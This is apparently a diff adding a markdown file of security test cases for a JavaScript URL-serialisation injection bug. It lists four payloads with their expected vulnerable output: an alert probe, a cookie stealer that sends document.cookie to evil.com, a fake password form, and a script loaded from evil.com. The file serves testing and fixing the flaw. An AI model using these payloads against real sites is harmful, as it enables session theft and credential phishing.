@@ -1,0 +1,76 @@
+# Exploitable Test Cases for Vulnerable Commit
+
+## Test Case 1: Injecting Alert via URL
+
+**Description:** Injects JavaScript code to trigger an alert popup.
+
+**Input:**
+```javascript
+new URL('https://x.com/");alert(1);//')
+```
+
+**Expected Vulnerable Output:**
+```javascript
+new URL("https://x.com/");alert(1);//")
+```
+
+**Impact:** JavaScript code execution (alert box triggered).
+
+---
+
+## Test Case 2: Cookie Stealer Injection
+
+**Description:** Attempts to steal document cookies.
+
+**Input:**
+```javascript
+new URL('https://attacker.com/");fetch("https://evil.com?cookie="+document.cookie);//')
+```
+
+**Expected Vulnerable Output:**
+```javascript
+new URL("https://attacker.com/");fetch("https://evil.com?cookie="+document.cookie);//")
+```
+
+**Impact:** User cookies are exfiltrated to an attacker-controlled server.
+
+---
+
+## Test Case 3: DOM Manipulation Attack
+
+**Description:** Modifies the DOM to display a phishing form.
+
+**Input:**
+```javascript
+new URL('https://x.com/");document.body.innerHTML="<form>Enter Password</form>";//')
+```
+
+**Expected Vulnerable Output:**
+```javascript
+new URL("https://x.com/");document.body.innerHTML="<form>Enter Password</form>";//")
+```
+
+**Impact:** Page content manipulated to phish user credentials.
+
+---
+
+## Test Case 4: Self-Replicating XSS Payload
+
+**Description:** Payload that writes itself back into the page.
+
+**Input:**
+```javascript
+new URL('https://x.com/");document.write("<script src=https://evil.com/xss.js></script>");//')
+```
+
+**Expected Vulnerable Output:**
+```javascript
+new URL("https://x.com/");document.write("<script src=https://evil.com/xss.js></script>");//")
+```
+
+**Impact:** Persistent XSS via loading external malicious scripts.
+
+---
+
+## Summary
+These test cases simulate real-world attack vectors where user-controlled inputs directly lead to JavaScript injection and execution. Fixes should ensure strict sanitization and escaping when inserting any dynamic values into executable code contexts.
